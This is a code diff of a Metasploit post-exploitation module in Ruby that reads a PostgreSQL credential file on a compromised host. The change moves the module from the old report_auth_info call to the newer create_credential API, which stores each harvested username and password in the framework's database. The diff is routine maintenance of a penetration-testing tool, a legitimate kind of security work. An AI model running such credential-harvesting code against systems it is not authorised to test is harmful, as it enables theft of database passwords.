@@ -73,6 +73,8 @@ class Metasploit3 < Msf::Post
     )
 
     read_file(f).each_line do |entry|
+      # skip comments
+      next if entry.lstrip[0,1] == "#"
       ip, port, db, user, pass = entry.chomp.split(/:/, 5)
 
       # Fix for some weirdness that happens with backslashes
@@ -97,21 +99,46 @@ class Metasploit3 < Msf::Post
       end
 
       pass = p
+
+      # Display the original before we try to report it, so the user
+      # sees whatever was actually in the file in case it's weird
       cred_table << [ip, port, db, user, pass]
 
-      cred_hash = {
-        :host => session.session_host,
-        :port => port,
-        :user => user,
-        :pass => pass,
-        :ptype => "password",
-        :sname => "postgres",
-        :source_type => "Cred",
-        :duplicate_ok => true,
-        :active => true
+      if ip == "*" || ip == "localhost"
+        ip = session.session_host
+      else
+        ip = Rex::Socket.getaddress(ip)
+      end
+
+      # Use the default postgres port if the file had a wildcard
+      port = 5432 if port == "*"
+
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: self.refname,
+        username: user,
+        private_data: pass,
+        private_type: :password,
+        realm_value: db,
+        realm_key: Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,
+        workspace_id: myworkspace_id
       }
 
-      report_auth_info(cred_hash)
+      credential_core = create_credential(credential_data)
+
+      login_data = {
+        address: ip,
+        port: port,
+        protocol: "tcp",
+        service_name: "postgres",
+        core: credential_core,
+        access_level: "User",
+        status: Metasploit::Model::Login::Status::UNTRIED,
+        workspace_id: myworkspace_id
+      }
+      create_credential_login(login_data)
+
     end
 
     if not cred_table.rows.empty?
